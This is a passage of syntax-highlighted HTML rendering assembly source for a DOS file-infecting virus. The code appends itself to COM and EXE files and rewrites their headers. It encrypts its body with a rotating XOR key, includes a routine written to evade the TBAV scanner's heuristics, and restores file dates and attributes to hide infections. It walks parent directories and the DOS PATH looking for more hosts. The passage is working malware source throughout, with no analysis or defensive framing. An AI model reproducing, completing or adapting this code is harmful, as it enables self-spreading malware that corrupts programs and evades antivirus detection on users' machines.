                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">compute_size</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                  </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                  </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">enough</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc5">enough</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc5">encipher</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">
                  </span><span class="sc1">;--------------------------------</span><span class="sc0">
                  </span><span class="sc1">;routine to avoid tbav "U" flag</span><span class="sc0">
                  </span><span class="sc1">;"U"=undocumented dos interrupt</span><span class="sc0">
                  </span><span class="sc1">;in fact tbav sets this flag</span><span class="sc0">
                  </span><span class="sc1">;if it finds "cdh,xyh" string</span><span class="sc0">
                  </span><span class="sc1">;where xy isnt a ordinary value</span><span class="sc0">
                  </span><span class="sc1">;for an interrupt. </span><span class="sc0">
    
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">queue</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+(</span><span class="sc5">begin_2nd</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">begin_2nd</span><span class="sc0">
      </span><span class="sc5">test_int</span><span class="sc4">:</span><span class="sc0">   
                  
                 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0cdh</span><span class="sc0">
                 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">encipher</span><span class="sc0">
                 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
                 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">test_int</span><span class="sc0">
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">

                  </span><span class="sc1">;-------------------------------</span><span class="sc0">
                  </span><span class="sc1">;90h=nop replace 'ret' by 'nop'</span><span class="sc0">
                  </span><span class="sc1">;for the first execution of crypt</span><span class="sc0">
                  </span><span class="sc1">;routine by the target exe</span><span class="sc0">
                  </span><span class="sc1">;in the buffer before write it.   </span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">queue</span><span class="sc4">+(</span><span class="sc5">_ret</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)],</span><span class="sc2">90h</span><span class="sc0"> 
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">
                 
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">
                  </span><span class="sc1">;write the virus to the target file</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">7</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">queue</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">
                  
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">
                  </span><span class="sc1">;set the file pointer of target to</span><span class="sc0">
                  </span><span class="sc1">;the beginning.</span><span class="sc0">
</span><span class="sc5">go_beginning</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">cwd</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc1">;-------------------------------</span><span class="sc0">

</span><span class="sc5">copy_new_header</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copy_exe</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">jmp_bytes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_copy</span><span class="sc0">
</span><span class="sc5">copy_exe</span><span class="sc4">:</span><span class="sc0">        
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">go_copy</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">inc_counter</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count_infect</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">restore_file_attribute</span><span class="sc4">:</span><span class="sc0">
                       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">attribute</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">new_dta</span><span class="sc0">
                       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">restore_date_time</span><span class="sc4">:</span><span class="sc0">
                       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">   
  </span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">end_infect2</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">restore_disk</span><span class="sc4">:</span><span class="sc0">           
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disk</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                  
                  
</span><span class="sc5">restore_directory</span><span class="sc4">:</span><span class="sc0">                   
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">slash</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">current_dir</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag_com</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag_com</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">    </span><span class="sc1">;set this flag to avoid </span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">count</span><span class="sc0"> 

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">restore_initial_ds_value</span><span class="sc4">:</span><span class="sc0">

                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_ds</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">restore_initial_dta</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_dta</span><span class="sc0">
</span><span class="sc5">restore_initial_24h_interrupt</span><span class="sc4">:</span><span class="sc0">

                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                 </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_int24h</span><span class="sc0">
                 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">restore_initial_es</span><span class="sc4">:</span><span class="sc0">                  
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_virus</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">finish_exe</span><span class="sc0">

</span><span class="sc5">return_com_host</span><span class="sc4">:</span><span class="sc0">

                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">finish_exe</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">set_cs_of_host_to_run_it</span><span class="sc4">:</span><span class="sc0">                  
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_cs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">set_stack_of_host</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">cli</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ss</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_sp</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">go_to_host_code</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">     </span><span class="sc1">; :=jmp xxxx:yyyy</span><span class="sc0">
</span><span class="sc5">old</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc5">old_ip</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;            yyyy </span><span class="sc0">
                  </span><span class="sc5">old_cs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;       xxxx </span><span class="sc0">
                  </span><span class="sc5">old_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">old_ss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">store</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc5">store_ip</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">store_cs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fff0h</span><span class="sc0">
                  </span><span class="sc5">store_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">store_ss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fff0h</span><span class="sc0">

</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc1">;search in current directory.</span><span class="sc0">

</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag_com</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">
                  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">its_exe</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">com_file</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">its_com</span><span class="sc0">
        </span><span class="sc5">its_exe</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_mask</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc5">its_com</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">search_again</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">





</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc1">;change directory to parent dir.</span><span class="sc0">

</span><span class="sc5">up_dir</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dot_dot</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">





</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc1">;find the next dir in dos path</span><span class="sc0">
</span><span class="sc1">;and set current dir=dir found.</span><span class="sc0">

</span><span class="sc5">change_path_dir</span><span class="sc4">:</span><span class="sc0">  

                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">new_dir</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc5">notyet</span><span class="sc4">:</span><span class="sc0">   
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">';'</span><span class="sc0">
                  </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc0"> 
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_end2</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">notyet</span><span class="sc0">
                  </span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
                       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_dir</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
                  </span><span class="sc6">ret</span><span class="sc0">
                  </span><span class="sc5">_end2</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------</span><span class="sc0">


 </span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 
</span><span class="sc5">change_xor_value</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_al</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc5">more</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_al</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                  
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">value</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                  
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      
                  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">again</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
             </span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">value</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">


 </span><span class="sc5">copy_virus_to_queue_buffer</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc1">;cld                 </span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">queue</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">crypt_main_part_of_virus_in_buffer</span><span class="sc4">:</span><span class="sc0">
                  
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_main</span><span class="sc4">-</span><span class="sc5">begin_main</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">queue</span><span class="sc4">+(</span><span class="sc5">begin_main</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">
                  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">crypt_2nd_part_of_virus_in_buffer</span><span class="sc4">:</span><span class="sc0">

                                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_2nd</span><span class="sc4">-</span><span class="sc5">begin_2nd</span><span class="sc0">
